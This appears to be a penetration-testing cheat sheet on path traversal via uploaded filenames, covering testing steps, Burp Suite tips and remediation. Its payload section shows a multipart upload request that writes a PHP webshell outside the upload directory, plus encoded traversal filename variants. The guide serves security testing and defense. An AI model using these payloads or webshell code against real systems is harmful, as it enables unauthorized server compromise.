# Path Traversal in Filename

## Overview
When an application uses the uploaded filename to construct a server-side storage path without sanitization, an attacker can supply a filename containing `../` sequences to write the file outside the intended upload directory. This can overwrite application files, configuration, or drop a webshell in an executable directory.

## How It Works
- Application saves file as: `os.path.join(upload_dir, filename)` where `filename` is from the multipart request.
- Attacker submits `filename="../../app/templates/evil.php"` — file lands in the templates directory.
- On Windows, `\` (backslash) can also traverse directories.
- Even without code execution, overwriting config, `.htaccess`, or `robots.txt` can cause damage.

## Impact
- Write a webshell outside the upload directory in a web-accessible path.
- Overwrite application configuration files.
- Replace server-side scripts with malicious versions.
- Overwrite `.htaccess` to change server behavior (e.g., enable PHP execution in upload dir).

## Where to Look
- Any multipart file upload where the `filename` parameter in `Content-Disposition` is used server-side.
- APIs that accept a filename as a separate parameter alongside file content.
- Archive extraction (zip, tar) where filenames inside the archive are used directly.

## Testing Steps
1. Intercept a file upload request in Burp.
2. Modify the `filename` parameter in `Content-Disposition`: `filename="../../../evil.txt"`.
3. Check if the file appears in a different directory (may need directory listing or a direct HTTP request to confirm).
4. Escalate: try writing to a web-accessible path: `filename="../../webroot/evil.php"`.
5. Try URL-encoded variants: `filename="..%2F..%2Fevil.txt"`.
6. Try Windows-style: `filename="..\..\..\evil.txt"` or `filename="..%5C..%5Cevil.txt"`.
7. Try null-byte to truncate suffix: `filename="../evil.php\x00.jpg"` (old PHP).

## Payloads / Techniques
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="../../evil.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------Boundary--
```

```
# Encoded variants
filename="..%2F..%2Fevil.php"
filename="....//....//evil.php"
filename="..\..\..\evil.php"   (Windows)
filename="../evil.php\x00.jpg" (null byte)
filename="....\/evil.php"
```

## Burp Suite Tips
- Intercept file upload in **Repeater** and manually modify the `filename` field.
- Use **Intruder** to fuzz the filename with a path traversal wordlist.
- After upload, test the target path with a GET request to confirm file placement.

## Tools
- Burp Suite Repeater / Intruder
- dotdotpwn — automated path traversal fuzzer

## Remediation
- Extract only the basename of the filename: `os.path.basename(filename)` in Python, `Path(filename).name` in Java.
- Canonicalize the full path and verify it starts with the expected upload directory.
- Generate a random filename server-side — ignore the client-supplied filename entirely.
- Store the original filename in a database entry mapped to the random server-side name.

## References
https://owasp.org/www-community/attacks/Path_Traversal
https://portswigger.net/web-security/file-upload
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
